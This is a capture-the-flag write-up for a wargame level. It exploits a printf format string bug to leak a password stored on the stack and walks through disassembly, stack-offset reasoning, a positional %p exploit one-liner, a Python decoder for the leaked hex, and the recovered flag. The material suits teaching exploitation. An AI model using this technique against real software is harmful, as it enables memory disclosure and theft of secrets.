# Format string attack again

## Program summary
On this level we have another authentication system, we notice on theses lines that our program recovers the password from the next level with **`fopen()`** to write it on the stack with **`fread()`** :

```
0000000000400814 <main>:
...
40089d:	b8 b2 0b 40 00       	mov    $0x400bb2,%eax
4008a2:	48 89 d6             	mov    %rdx,%rsi
4008a5:	48 89 c7             	mov    %rax,%rdi
4008a8:	e8 53 fe ff ff       	callq  400700 <fopen@plt>
...
4008e6:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
4008ed:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
4008f1:	48 89 d1             	mov    %rdx,%rcx
4008f4:	ba 29 00 00 00       	mov    $0x29,%edx
4008f9:	be 01 00 00 00       	mov    $0x1,%esi
4008fe:	48 89 c7             	mov    %rax,%rdi
400901:	e8 8a fd ff ff       	callq  400690 <fread@plt>
```
Content of **0x400bb2** :
```
(gdb) x/s 0x400bb2
0x400bb2:        "/home/users/level03/.pass"
```

## Vulnerability
We can notice a **`printf()`** which prints the username, therefore an entry from us.

Since the password resides on the stack and **`printf()`** is vulnerable to format string attacks, we'll use it to read into memory this time.

## Attack design
 The **$RSP** has been subtracted from **0x120** Bytes at the prolog, and the contents of the next level password are set to **` $RBP-0xa0`**,  so we need to determine an offset. To do this, we know that the buffer that **`printf()`** uses starts at **` $RBP-0x70`**, so if we guess the position of this buffer in the stack, we could calculate the exact position of the password located at **` $RBP-0xa0`**.

The stack frame contains in the 28th position our buffer from the start at the time of printf execution.

```
--[ Username: AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x 

AAAA ffffe3d0 0 61 2a2a2a2a 2a2a2a2a ffffe5c8 f7ff9a08 647361 0 0 0 0 0 0 0 0 0 0 0 0 0 34376848 61733951 574e6758 6e475873 664b394d 0 41414141 25207825 20782520 78252078  does not have access!
```

```
|---------------------|
|        AAAA         | <--- Buffer location RBP-0x70 (At 28th position from the printf stackframe)
|---------------------|
|     48 Bytes Gap    |
|---------------------|
|   ***************   | <--- Password location RBP-0xa0
|---------------------|
|     Unknown gap     |
|---------------------|
|         ...         | <--- printf() stackframe
|---------------------|
|         ...         | <--- //
|---------------------|
|         ...         | <--- //
|---------------------|

```

Given that between the buffer & password location we have a space of 48 bytes, we divide **`48 / 8 = 6`**, because a position with our specified type is equal to 8 bytes, consequently we must subtract 6 positions from 28 which leaves us at position 22th. Our password is exactly 41 bytes, so we need 5 %p and respect the little little endianness convention.

Here is the python script which allows us to convert the hexa little endian format into our flag.



```py
python -c 'print "%26$p %25$p %24$p %23$p %22$p\n"' | ./level02
```

```py
def little_endian_to_big_endian(hex_string):
    if len(hex_string) % 2 != 0:
        raise ValueError("Format error")
    hex_pairs = [hex_string[i:i+2] for i in range(0, len(hex_string), 2)]
    big_endian_hex = ''.join(reversed(hex_pairs))
    return big_endian_hex

def hex_to_ascii(hex_string):
    hex_string = hex_string.replace('0x', '')
    hex_string = little_endian_to_big_endian(hex_string)
    ascii_string = bytes.fromhex(hex_string).decode('utf-8')
    return ascii_string

hex_strings = [
    "0x756e505234376848",
    "0x45414a3561733951",
    "0x377a7143574e6758",
    "0x354a35686e475873",
    "0x48336750664b394d"
]

concatenated_ascii = ""

for hex_str in hex_strings:
    concatenated_ascii += hex_to_ascii(hex_str)

print("Concatenated ASCII: ", concatenated_ascii)

```

> Flag : `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
